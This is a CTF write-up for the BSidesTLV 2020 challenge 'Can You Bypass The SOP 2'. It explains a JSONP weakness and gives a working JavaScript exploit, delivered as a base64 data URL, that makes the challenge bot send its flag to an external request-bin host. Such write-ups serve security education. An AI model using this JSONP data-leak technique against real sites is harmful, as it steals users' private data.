# Can You Bypass The SOP 2
* Category: Web
* 150 Points
* Solved by the JCTF Team

## Description
> Hi Agent! Your mission is to exfiltrate data of our target, so we can catch him! Can you do it?
> 
> URL: https://can-you-bypass-the-sop.ctf.bsidestlv.com/
> 
> BOT: https://can-you-bypass-the-sop.ctf.bsidestlv.com/bot


## Solution

Two years ago there was a challenge called [Can you bypass the SOP?](https://jctf.team/BSidesTLV-2018/Can-you-bypass-the-SOP/) and this must be the follow-up.

We get two links. The first one contains a login form:
```html
<form class="login100-form validate-form" id="login" method="post">
    <span class="login100-form-avatar">
            <img src="images/avatar-01.jpg" alt="AVATAR">
        </span>

    <div class="wrap-input100 validate-input m-t-85 m-b-35" data-validate = "Enter username">
        <input class="input100" type="text" name="username">
        <span class="focus-input100" data-placeholder="Username"></span>
    </div>

    <div class="wrap-input100 validate-input m-b-50" data-validate="Enter password">
        <input class="input100" type="password" name="pass">
        <span class="focus-input100" data-placeholder="Password"></span>
    </div>

    <div class="container-login100-form-btn">
        <button class="login100-form-btn">
            Sign in
        </button>
    </div>

    <div class="container-login100-form-btn" style="margin-top: 20px;">
        <button class="login100-form-btn" id="select_div_SIGNIN">
            <a href="#" onclick="signIn()">Join as a Guest</a>
        </button>
    </div>
</form>
```

The only button with an actual implementation is the "Join as a Guest" button:
```javascript
function signIn() {
    let http = new XMLHttpRequest();
    http.open('POST', 'signIn', true);
    http.setRequestHeader('Content-type', 'application/json');
    http.onreadystatechange = function() {//Call a function when the state changes.
        if(http.readyState === 4 && http.status === 200) {
            $.ajax({
                dataType: 'jsonp',
                jsonp: 'callback',
                url: '/FetchUserInfo?callback=?',
                success: function (data) {
                    $("#login").html(
                        `<span class="login100-form-title p-b-70">Welcome ${data.username}!</span>
                                     <span class="login100-form-avatar">
                                     <img src="images/avatar-01.jpg" alt="AVATAR"></span>
                                     <div class="container-login100-form-btn" style="margin-top: 20px">
                                        <button class="login100-form-btn" id="select_div_SIGNIN" onclick="signOut()">
                                            Sign Out
                                        </button>
                                     </div>`);
                }
            });
        }
    };
    http.send(JSON.stringify({username: "Guest"}));
}
```

The second link contains a form which we can use to send a bot to visit any link we'd like.

The guest sign-in flow uses [JSONP](https://en.wikipedia.org/wiki/JSONP) which is a cool and tricky "hack" to bypass the same-origin policy (SOP). If you're not familiar with it, take some time to read about it before continuing.

The flow is as follows:
1. The user clicks the "Join as a Guest" button
2. The `signIn()` function is triggered
3. It performs a `POST` request to `/signIn` with `username=Guest`
4. When the request completes, it performs a `JSONP` request to `/FetchUserInfo` and provides it with a callback via the `callback=?` parameter. This callback is created by jQuery and receives a random name during runtime, e.g. `jQuery3210941923338379376_1593543672495`
5. `/FetchUserInfo` returns with a response similar to the following: `typeof jQuery3210941923338379376_1593543672495 === 'function' && jQuery3210941923338379376_1593543672495({"username":"Guest","flag":"You are on the right track!","iat":1593544479});`. This actually calls the callback we've defined earlier **as a function**, and when included as a script allows bypassing the SOP since any site can include a script from any site.
6. The callback function can access the data and use it

As you can see, when we sign in to as guests, we receive a response which contains a "flag" member. Ours says "You are on the right track!" but probably when the bot logs in he receives the real flag. So, the trick is to get the bot to log in and leak us the response.

In our solution we used data URLs to get the bot to run Javascript for us. Here's how we did it:

First, we created a [Request Bin](https://requestbin.com) which is a service that logs all requests to a given endpoint. This allows us to "debug" and later on leak information from the bot's actions.

Then, we created the following script:
```html
<script src='https://code.jquery.com/jquery-3.5.1.min.js'></script>
<script> 
function myCallback(data)
{ 
    $.get('https://enpyz5s7lavr.x.pipedream.net/?action=callback&flag='+window.btoa(data.flag));
} 

$.post('https://can-you-bypass-the-sop.ctf.bsidestlv.com/signIn', {"username":"Guest"}, function(data, status, xhr) {
  $.get('https://enpyz5s7lavr.x.pipedream.net/?action=signIn');
  $.getScript( "https://can-you-bypass-the-sop.ctf.bsidestlv.com/FetchUserInfo?callback=myCallback", function( data, textStatus, jqxhr ) {
    $.get('https://enpyz5s7lavr.x.pipedream.net/?action=includeScript');
  });
});
</script>
```

It starts by signing in as a guest. After successfully signing in, it calls the JSONP API to fetch the bot's user info, providing a callback to be called with the user info. The callback simply leaks the flag to us via the request bin.

Next, we encode the script as base64:
```
[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]OwogIH0pOwp9KTsKPC9zY3JpcHQ+
```

And we prepend the data URL prefix:
```
data:text/html;base64,[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]OwogIH0pOwp9KTsKPC9zY3JpcHQ+
```

Now, we just need to send the link to the bot:
```console
root@kali:/media/sf_CTFs/bsidestlv/SOP# curl 'https://can-you-bypass-the-sop.ctf.bsidestlv.com/bot' \
>   -H 'Content-Type: application/json' \
>   --data-binary '{"url":"data:text/html;base64,[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]OwogIH0pOwp9KTsKPC9zY3JpcHQ+"}' && echo
Sent!
```

We inspect the Request Bin and observe that we have received a request:
```
/?action=callback&flag=[AWS_SECRET_REMOVED]VGhlX0NPUlNfQnlfRGVzaWduIX0=
```

Let's decode the flag:
```console
root@kali:/media/sf_CTFs/bsidestlv/SOP# echo [AWS_SECRET_REMOVED]VGhlX0NPUlNfQnlfRGVzaWduIX0= | base64 -d
BSidesTLV2020{JSONP_Is_Bypass_The_CORS_By_Design!}
```